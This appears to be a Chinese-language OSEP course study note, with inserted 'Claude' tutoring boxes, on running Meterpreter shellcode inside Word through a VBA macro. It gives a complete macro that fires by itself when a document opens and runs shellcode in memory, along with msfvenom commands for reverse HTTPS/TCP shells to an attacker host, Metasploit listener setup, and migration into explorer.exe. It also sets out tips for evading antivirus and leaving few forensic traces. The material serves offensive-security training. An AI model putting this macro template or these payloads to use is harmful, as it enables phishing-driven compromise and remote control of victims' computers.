---
title: OSEP-03-VBA-Shellcode执行器
description: '03-Office宏攻击 | 03-VBA-Shellcode执行器'
pubDate: 2026-01-30T00:00:12+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - Phishing
---

# VBA Shellcode 执行器 - 在 Word 内存中执行恶意代码

---

## 【Claude的学习建议】

> **这是OSEP最核心的技术，没有之一！**
>
> 掌握这个技术后，你就理解了：
> - 为什么恶意宏能够获取系统控制权
> - shellcode是如何在内存中执行的
> - VBA如何调用Windows底层API
>
> **学习目标**：
> 1. 理解shellcode执行的三个步骤
> 2. 理解每个Win32 API的作用
> 3. 能够看懂并修改shellcode执行器代码
>
> **给零基础同学的话**：
> 这章的代码看起来很复杂，但核心逻辑只有三步：
> 1. 申请一块可以执行代码的内存
> 2. 把shellcode复制进去
> 3. 让CPU去执行那块内存
>
> 就像是：租个房间 → 搬进去 → 开始干活

---

## 写在前面

这是 OSEP 课程中**最核心的技术之一**！掌握这个技术后，你将能够：
- 在 Word 进程内存中直接执行 shellcode
- 避免恶意文件落地到磁盘
- 绑定大部分基于文件的杀软检测

**Web 安全类比**：
- 这就像是在浏览器内存中执行 JavaScript，而不是下载一个 .exe 文件
- 类似于"内存马"的概念

---

## 第一部分：为什么需要内存执行？

### 1.1 传统方法的问题

在前面的章节中，我们学习了下载并执行 .exe 文件的方法：

```
传统方法流程：
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│  VBA 宏     │────▶│ 下载 .exe   │────▶│ 执行 .exe   │
│             │     │ 到磁盘      │     │             │
└─────────────┘     └─────────────┘     └─────────────┘
                          │                    │
                          ▼                    ▼
                    ⚠️ 网络监控检测        ⚠️ 杀软检测
                    ⚠️ 文件落地            ⚠️ 取证痕迹
```

**问题**：
1. **网络监控**：下载 .exe 文件可能触发 IDS/IPS 告警
2. **杀软检测**：磁盘上的 .exe 文件会被杀软扫描
3. **取证痕迹**：文件系统上留下证据

### 1.2 内存执行的优势

```
内存执行流程：
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│  VBA 宏     │────▶│ 分配内存    │────▶│ 执行 shellcode│
│             │     │ 复制代码    │     │ (在内存中)   │
└─────────────┘     └─────────────┘     └─────────────┘
                          │
                          ▼
                    ✅ 无文件落地
                    ✅ 绕过文件扫描
                    ✅ 难以取证
```

---

## 第二部分：核心概念

### 2.1 什么是 Shellcode？

**Shellcode** 是一段可以直接被 CPU 执行的机器码（汇编指令的二进制形式）。

```
高级语言代码 → 编译 → 机器码 (Shellcode)

例如：
C 代码:     printf("Hello");
    ↓ 编译
机器码:     0x48 0x83 0xec 0x28 0x48 0x8d 0x0d ...
```

**Shellcode 的特点**：
- 不依赖任何库（自包含）
- 位置无关（可以在任何内存地址执行）
- 体积小（通常几百字节到几 KB）

### 2.2 执行 Shellcode 的三个步骤

```
步骤 1: 分配可执行内存
┌─────────────────────────────────────────────────────────┐
│ VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_RW)  │
│                                                         │
│ 作用：向操作系统申请一块内存                             │
│ 关键：这块内存必须有"执行"权限                          │
└─────────────────────────────────────────────────────────┘
                            │
                            ▼
步骤 2: 复制 Shellcode 到内存
┌─────────────────────────────────────────────────────────┐
│ RtlMoveMemory(addr, shellcode, size)                   │
│                                                         │
│ 作用：把 shellcode 字节复制到分配的内存中               │
└─────────────────────────────────────────────────────────┘
                            │
                            ▼
步骤 3: 创建线程执行
┌─────────────────────────────────────────────────────────┐
│ CreateThread(NULL, 0, addr, NULL, 0, NULL)             │
│                                                         │
│ 作用：创建一个新线程，从 shellcode 地址开始执行         │
└─────────────────────────────────────────────────────────┘
```

> 【Claude的深入解释】
>
> **为什么需要这三步？让我用生活例子解释：**
>
> ```
> 想象你要在一个城市里开一家店：
>
> 步骤1：VirtualAlloc = 租店面
> ├── 你告诉房东："我要租一个100平米的店面"
> ├── 房东说："好的，给你这个地址：0x12340000"
> ├── 关键：你要告诉房东这个店面要"可以营业"（可执行）
> └── 如果只租了仓库（只读/只写），你就不能在里面做生意
>
> 步骤2：RtlMoveMemory = 装修搬货
> ├── 你把货物（shellcode）搬到店面里
> ├── 一件一件地搬（逐字节复制）
> └── 搬完后，店面里就有了你的"商品"
>
> 步骤3：CreateThread = 开业
> ├── 你雇一个员工（线程）
> ├── 告诉他："从店面门口开始工作"
> ├── 员工开始执行你的"业务"（shellcode）
> └── 你的"生意"就开始运转了
> ```
>
> **为什么不能直接执行？**
> - 普通内存默认是"不可执行"的（DEP保护）
> - 就像你不能在住宅区开工厂一样
> - 必须申请"商业用地"（可执行内存）

---

## 第三部分：Win32 API 详解

> 【Claude的学习建议】
>
> 这三个API是OSEP中最重要的API，你会在各种场景中反复看到它们：
> - VBA宏执行shellcode
> - C#执行shellcode
> - 进程注入
> - DLL注入
>
> **记住这个组合**：VirtualAlloc + RtlMoveMemory + CreateThread = 内存执行shellcode

### 3.1 VirtualAlloc - 分配内存

> 【Claude的重点解释】
>
> **VirtualAlloc是"租房子"的API**
>
> 你告诉Windows："我要一块内存"，Windows给你一个地址。
>
> **最重要的参数是 flProtect（内存保护属性）**：
> - 0x04 = 可读可写（普通数据）
> - 0x40 = 可读可写可执行（shellcode必须用这个！）
>
> **为什么0x40这么重要？**
> - Windows有个安全机制叫DEP（数据执行保护）
> - 默认情况下，数据区域的代码不能执行
> - 0x40告诉Windows："这块内存我要执行代码"

**MSDN 函数原型**：
```c
LPVOID VirtualAlloc(
  LPVOID lpAddress,        // 期望的内存地址（通常设为 NULL）
  SIZE_T dwSize,           // 要分配的大小（字节）
  DWORD  flAllocationType, // 分配类型
  DWORD  flProtect         // 内存保护属性
);
```

**参数详解**：

| 参数 | 类型 | 说明 | 常用值 |
|------|------|------|--------|
| lpAddress | 指针 | 期望的起始地址 | 0（让系统决定） |
| dwSize | 整数 | 分配大小 | shellcode 长度 |
| flAllocationType | 整数 | 分配类型 | 0x3000 (MEM_COMMIT \| MEM_RESERVE) |
| flProtect | 整数 | 内存保护 | 0x40 (PAGE_EXECUTE_READWRITE) |

**内存保护属性**：

```
常用内存保护属性：
┌────────────────────────┬────────┬─────────────────────────┐
│ 名称                   │ 值     │ 说明                    │
├────────────────────────┼────────┼─────────────────────────┤
│ PAGE_NOACCESS          │ 0x01   │ 禁止访问                │
│ PAGE_READONLY          │ 0x02   │ 只读                    │
│ PAGE_READWRITE         │ 0x04   │ 可读可写                │
│ PAGE_EXECUTE           │ 0x10   │ 可执行                  │
│ PAGE_EXECUTE_READ      │ 0x20   │ 可执行可读              │
│ PAGE_EXECUTE_READWRITE │ 0x40   │ 可读可写可执行 ⭐       │
└────────────────────────┴────────┴─────────────────────────┘

⚠️ 重要：执行 shellcode 必须使用 PAGE_EXECUTE_READWRITE (0x40)
   否则会触发 DEP (数据执行保护) 异常！
```

**VBA 声明**：
```vba
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As Long, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long _
) As LongPtr
```

### 3.2 RtlMoveMemory - 复制内存

**MSDN 函数原型**：
```c
VOID RtlMoveMemory(
  VOID UNALIGNED *Destination,  // 目标地址
  VOID UNALIGNED *Source,       // 源地址
  SIZE_T         Length         // 复制长度
);
```

**参数详解**：

| 参数 | 类型 | 说明 |
|------|------|------|
| Destination | 指针 | 目标内存地址（VirtualAlloc 返回的地址） |
| Source | 指针 | 源数据地址（shellcode 数组元素） |
| Length | 整数 | 要复制的字节数 |

**VBA 声明**：
```vba
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" ( _
    ByVal lDestination As LongPtr, _
    ByRef sSource As Any, _
    ByVal lLength As Long _
) As LongPtr
```

**注意**：
- `lDestination` 使用 `ByVal` 因为我们传递的是地址值
- `sSource` 使用 `ByRef` 因为我们需要传递数据的地址

### 3.3 CreateThread - 创建线程

**MSDN 函数原型**：
```c
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes,  // 安全属性
  SIZE_T                  dwStackSize,         // 栈大小
  LPTHREAD_START_ROUTINE  lpStartAddress,      // 起始地址 ⭐
  LPVOID                  lpParameter,         // 传递给线程的参数
  DWORD                   dwCreationFlags,     // 创建标志
  LPDWORD                 lpThreadId           // 线程 ID
);
```

**参数详解**：

| 参数 | 类型 | 说明 | 常用值 |
|------|------|------|--------|
| lpThreadAttributes | 指针 | 安全属性 | 0 |
| dwStackSize | 整数 | 栈大小 | 0（使用默认） |
| lpStartAddress | 指针 | **执行起始地址** | shellcode 地址 |
| lpParameter | 指针 | 线程参数 | 0 |
| dwCreationFlags | 整数 | 创建标志 | 0 |
| lpThreadId | 指针 | 输出线程 ID | 0 |

**VBA 声明**：
```vba
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" ( _
    ByVal SecurityAttributes As Long, _
    ByVal StackSize As Long, _
    ByVal StartFunction As LongPtr, _
    ThreadParameter As LongPtr, _
    ByVal CreateFlags As Long, _
    ByRef ThreadId As Long _
) As LongPtr
```

---

## 第四部分：生成 Shellcode

### 4.1 使用 msfvenom 生成

```bash
# 生成 64 位 Meterpreter HTTPS 反向 shell
# 输出格式为 VBA 数组
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 \
    LPORT=443 \
    EXITFUNC=thread \
    -f vbapplication

# ========== 参数详解 ==========
# -p : 指定 payload
#      windows/x64/meterpreter/reverse_https = 64位 HTTPS 反向 Meterpreter
#
# LHOST : 攻击者 IP（监听地址）
#
# LPORT : 攻击者端口（监听端口）
#
# EXITFUNC=thread : 退出方式
#      ⚠️ 重要！必须设置为 thread
#      如果设置为 process（默认），shellcode 退出时会关闭 Word
#      设置为 thread 只会结束当前线程，Word 继续运行
#
# -f vbapplication : 输出格式为 VBA 数组
```

**输出示例**：
```
Payload size: 793 bytes
Final size of vbapplication file: 2655 bytes
buf = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,72,49,210,81,101,72, _
139,82,96,72,139,82,24,72,139,82,32,72,139,114,80,72,15,183,74,74,77,49,201, _
...
65,137,218,255,213)
```

### 4.2 32 位 vs 64 位

```
如何选择架构？

┌─────────────────────────────────────────────────────────┐
│ Office 版本          │ 架构    │ 使用的 Payload        │
├─────────────────────────────────────────────────────────┤
│ Office 2016/2019     │ 32 位   │ windows/meterpreter/  │
│ Office 365/2021      │ 64 位   │ windows/x64/meterpreter/│
└─────────────────────────────────────────────────────────┘

⚠️ 架构必须匹配！
   64 位 shellcode 无法在 32 位 Office 中运行
   32 位 shellcode 无法在 64 位 Office 中运行
```

**检查 Office 架构**：
1. 打开 Word
2. 点击 `文件` → `账户` → `关于 Word`
3. 查看是 32-bit 还是 64-bit

---

## 第五部分：完整代码

### 5.1 完整的 VBA Shellcode 执行器

```vba
' ============================================================
' VBA Shellcode Runner
' 功能：在 Word 进程内存中执行 Meterpreter shellcode
'
' 使用方法：
' 1. 用 msfvenom 生成 shellcode（见下方注释）
' 2. 将生成的 buf 数组粘贴到代码中
' 3. 保存为 .doc 或 .docm 格式
' 4. 在 Kali 上启动 multi/handler 监听器
' 5. 打开文档并启用宏
' ============================================================

Option Explicit

' ==================== Win32 API 声明 ====================
' VirtualAlloc - 分配可执行内存
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As Long, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long _
) As LongPtr

' RtlMoveMemory - 复制内存
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" ( _
    ByVal lDestination As LongPtr, _
    ByRef sSource As Any, _
    ByVal lLength As Long _
) As LongPtr

' CreateThread - 创建执行线程
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" ( _
    ByVal SecurityAttributes As Long, _
    ByVal StackSize As Long, _
    ByVal StartFunction As LongPtr, _
    ThreadParameter As LongPtr, _
    ByVal CreateFlags As Long, _
    ByRef ThreadId As Long _
) As LongPtr

' ==================== 常量定义 ====================
' 内存分配类型
Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000

' 内存保护属性
Private Const PAGE_EXECUTE_READWRITE As Long = &H40

' ==================== 自动执行入口 ====================
' 文档打开时自动执行（Word 2007+）
Sub Document_Open()
    RunShellcode
End Sub

' 文档打开时自动执行（兼容旧版本）
Sub AutoOpen()
    RunShellcode
End Sub

' ==================== 主函数 ====================
Sub RunShellcode()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr

    ' ========== 在此处粘贴 msfvenom 生成的 shellcode ==========
    ' 生成命令：
    ' msfvenom -p windows/x64/meterpreter/reverse_https LHOST=YOUR_IP LPORT=443 EXITFUNC=thread -f vbapplication
    '
    ' 注意：以下只保留示例字节，请替换为你自己生成的完整 shellcode。
    ' 不要在 Array 的续行链中插入注释，否则 VBA 会报语法错误。
    buf = Array(252, 72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, _
    72, 49, 210, 81, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, _
    72, 139, 114, 80, 72, 15, 183, 74, 74, 77, 49, 201, 72, 49, 192, 172, 60, _
    65, 137, 218, 255, 213)
    ' ===========================================================

    ' 步骤 1: 分配可执行内存
    ' VirtualAlloc(0, 大小, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    addr = VirtualAlloc(0, UBound(buf) - LBound(buf) + 1, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)

    ' 检查是否分配成功
    If addr = 0 Then
        ' 分配失败，静默退出
        Exit Sub
    End If

    ' 步骤 2: 复制 shellcode 到分配的内存
    ' 逐字节复制
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ' 步骤 3: 创建线程执行 shellcode
    ' CreateThread(0, 0, shellcode地址, 0, 0, 0)
    res = CreateThread(0, 0, addr, 0, 0, 0)

End Sub
```

### 5.2 代码执行流程图

```
用户打开文档
      │
      ▼
┌─────────────────┐
│ Document_Open() │ ← 自动触发
│ 或 AutoOpen()   │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ RunShellcode()  │
└────────┬────────┘
         │
         ▼
┌─────────────────────────────────────────┐
│ 1. VirtualAlloc()                       │
│    分配 793 字节可执行内存               │
│    返回内存地址: 0x00007FF8A1230000     │
└────────┬────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────┐
│ 2. For 循环 + RtlMoveMemory()           │
│    逐字节复制 shellcode 到内存           │
│    buf[0] → addr+0                      │
│    buf[1] → addr+1                      │
│    ...                                  │
│    buf[792] → addr+792                  │
└────────┬────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────┐
│ 3. CreateThread()                       │
│    创建新线程                            │
│    从 addr 地址开始执行                  │
└────────┬────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────┐
│ Shellcode 执行                          │
│ → 连接到攻击者的 C2 服务器               │
│ → 建立 Meterpreter 会话                 │
└─────────────────────────────────────────┘
```

---

## 第六部分：设置监听器

### 6.1 Metasploit 监听器配置

```bash
# 启动 Metasploit
msfconsole -q

# 使用 multi/handler
use multi/handler

# 设置 payload（必须与 msfvenom 一致！）
set payload windows/x64/meterpreter/reverse_https

# 设置监听地址和端口
set LHOST 192.168.119.120
set LPORT 443

# 设置 EXITFUNC（与 msfvenom 一致）
set EXITFUNC thread

# 开始监听
exploit
```

### 6.2 成功连接的输出

```
[*] Started HTTPS reverse handler on https://192.168.119.120:443
[*] https://192.168.119.120:443 handling request from 192.168.120.11
[*] https://192.168.119.120:443 handling request from 192.168.120.11
[*] Staging x64 payload (207449 bytes) ...
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.11:49678)

meterpreter > getuid
Server username: DESKTOP-XXX\victim

meterpreter > sysinfo
Computer        : DESKTOP-XXX
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows
```

---

## 第七部分：常见问题与解决

### 7.1 问题排查清单

| 问题 | 可能原因 | 解决方法 |
|------|---------|---------|
| 宏不执行 | 宏被禁用 | 检查 Trust Center 设置 |
| 没有回连 | IP/端口错误 | 检查 LHOST/LPORT |
| 没有回连 | 防火墙阻止 | 检查 Windows 防火墙 |
| Word 崩溃 | 架构不匹配 | 32位 Office 用 32位 shellcode |
| Word 崩溃 | EXITFUNC 错误 | 确保设置为 thread |
| 连接后断开 | 杀软拦截 | 尝试编码或混淆 |

### 7.2 调试技巧

```vba
' 添加调试信息（测试时使用，实战时删除）
Sub RunShellcode()
    ' ... 代码 ...

    ' 调试：显示分配的内存地址
    MsgBox "Memory allocated at: " & Hex(addr)

    ' 调试：显示 shellcode 大小
    MsgBox "Shellcode size: " & UBound(buf)

    ' ... 代码 ...
End Sub
```

### 7.3 Word 关闭后 Shell 断开

**问题**：关闭 Word 后，Meterpreter 会话断开

**原因**：Shellcode 在 Word 进程中执行，Word 关闭后进程结束

**解决方法**：
1. 使用 Meterpreter 的 `migrate` 命令迁移到其他进程
2. 或者使用 `AutoMigrate` 模块自动迁移

```
meterpreter > migrate -N explorer.exe
[*] Migrating from 1234 to 5678...
[*] Migration completed successfully.
```

---

## 第八部分：代码汇总

### 8.1 生成 Shellcode

```bash
# 64 位 HTTPS Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 EXITFUNC=thread -f vbapplication

# 32 位 HTTPS Meterpreter
msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=443 EXITFUNC=thread -f vbapplication

# 64 位 TCP Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC=thread -f vbapplication
```

### 8.2 监听器命令

```bash
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST <IP>
set LPORT 443
set EXITFUNC thread
exploit
```

### 8.3 完整 VBA 模板

见第五部分的完整代码。

---

## 第九部分：练习题

### 选择题

1. VirtualAlloc 的 PAGE_EXECUTE_READWRITE 值是？
   - A) 0x10
   - B) 0x20
   - C) 0x40
   - D) 0x80

2. 为什么 EXITFUNC 要设置为 thread？
   - A) 提高执行速度
   - B) 避免关闭 Word 进程
   - C) 绕过杀软
   - D) 减小 shellcode 体积

3. 以下哪个 API 用于创建执行线程？
   - A) VirtualAlloc
   - B) RtlMoveMemory
   - C) CreateThread
   - D) WaitForSingleObject

4. MEM_COMMIT | MEM_RESERVE 的组合值是？
   - A) 0x1000
   - B) 0x2000
   - C) 0x3000
   - D) 0x4000

### 实践题

1. 生成一个 64 位的 reverse_https shellcode，并创建完整的 VBA 宏。

2. 修改代码，添加 WaitForSingleObject 等待线程执行完成。

### 答案

**选择题**：1-C, 2-B, 3-C, 4-C

---

## 下一步

掌握了 VBA Shellcode 执行器后，继续学习 [06-PowerShell-Shellcode.md](/blog/osep/03-office宏攻击/06-powershell-shellcode/)，了解如何使用 PowerShell 实现更强大的 shellcode 执行器。
